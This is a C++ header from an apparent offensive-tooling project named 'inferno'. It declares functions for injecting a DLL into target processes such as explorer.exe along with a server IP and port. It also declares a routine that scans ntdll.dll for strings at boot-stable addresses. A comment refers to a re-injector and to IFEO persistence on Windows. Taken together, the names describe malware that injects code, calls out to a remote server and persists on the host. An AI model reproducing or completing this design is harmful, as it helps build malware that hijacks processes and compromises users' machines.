#pragma once

#include <cstddef>
#include <cstdint>
#include <string>
#include "EntitlementScanner.hpp"

namespace inferno { namespace tier2 {

bool injectIntoTarget(const TargetApp& target,
                      const std::string& dll_path,
                      const std::string& server_ip,
                      uint16_t server_port);

#ifdef _WIN32
// Scan ntdll.dll's .rdata for a needle string. Returns pointer into local
// ntdll mapping — the same address is valid in every process on this boot.
const char* findNtdllString(const char* needle, size_t needle_len);

// Find a process PID by executable name (e.g. "explorer.exe")
DWORD findProcessPid(const std::string& exec_path);

// Inject directly into a specific PID (skips process lookup)
// Used by re-injector / IFEO persistence on Windows
bool injectIntoTarget(DWORD pid,
                      const std::string& dll_path,
                      const std::string& server_ip,
                      uint16_t server_port);
#endif

}} // namespace inferno::tier2
